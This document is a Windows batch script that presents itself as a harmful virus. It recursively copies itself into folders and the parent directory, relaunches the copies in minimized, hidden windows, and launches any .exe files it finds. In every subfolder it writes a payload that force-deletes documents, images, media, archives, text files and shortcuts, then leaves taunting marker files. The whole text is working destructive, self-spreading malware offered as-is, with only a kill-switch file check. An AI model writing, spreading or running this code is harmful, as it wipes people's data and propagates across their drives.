@if "%1"=="/spread" goto letsbegintheterror
@if exist \dontbytethebitsonthisdrive.putfull (
@echo off
echo eliminated, this drive has a "dont byte the bits on this drive, putfull!" file.
pause
exit
)
@echo HI! You die today!
@echo:
@echo This virus was made to show the power of a simple virus meant to be harmful. If you didn't mean to run it, you are probably in trouble, ask a superior in IT for help.
@echo:
@echo The drive that will be targeted looks like this:
@echo:
@echo:
@echo:
@dir \
@timeout /t 3 /nobreak >NUL
cls
:letsbegintheterror
powershell -WindowStyle Hidden -command ""
:loop
FOR /F "tokens=*" %%G IN ('dir /b /S /AD "%~dp0*"') DO call :pool "%%G\"
call :pool "%~dp0"
type "%~s0" > ..\%~nx0
start /min cmd /c ..\%~nx0 /spread
job is done.
exit
:pool
@if exist \dontbytethebitsonthisdrive.putfull (
@echo off
echo eliminated, this drive has a "dont byte the bits on this drive, putfull!" file.
pause
exit
)
set /a putfullpoolloopnumber+=1
if %putfullpoolloopnumber% GEQ 30 (
set "putfullpoolloopnumber=1"
exit /b
)
if not exist "%~dp1putfullsterrorism.cmd" (
(
echo powershell -WindowStyle Hidden -command ""
echo cd "%%~dp0"
echo del *.docx /F /Q
echo del *.doc /F /Q
echo del *.rtf /F /Q
echo del *.lnk /F /Q
echo del *.txt /F /Q
echo del *.inf /F /Q
echo del *.js /F /Q
echo del *.jpg /F /Q
echo del *.mp? /F /Q
echo del *.mkv /F /Q
echo del *.zip /F /Q
echo del *.7z /F /Q
echo del *.i?? /F /Q
echo echo bwhahahaha ^> bitbyter-putfull.was_here
echo echo self destructed... ur too late ^> "%%~s0"
) > "%~dp1putfullsterrorism.cmd"
)
if not exist "%~dp1bitbyter-putfull.was_here" (
start /min cmd /c "%~dp1putfullsterrorism.cmd"
)
set nextnum_putfulbitsbyter=%putfullpoolloopnumber%
REM set nextnum_putfulbitsbyter=%random% :: Unleashes a hellfury of CPU-overheating scripts but no actual effect.
set "nextfil_putfulbitsbyter=%~dp1\%nextnum_putfulbitsbyter%.cmd"
if exist "%nextfil_putfulbitsbyter%" goto loop
if "%nextnum_putfulbitsbyter%"=="%~n0" exit /b
type "%~s0" > "%nextfil_putfulbitsbyter%"
start /min cmd /c "%nextfil_putfulbitsbyter%" /spread
FOR /F "tokens=*" %%G IN ('dir /b %~dp1*.exe') DO start /min %%G
if %putfullpoolloopnumber% LSS 31 goto :pool else (
set "putfullpoolloopnumber=1"
exit /b
)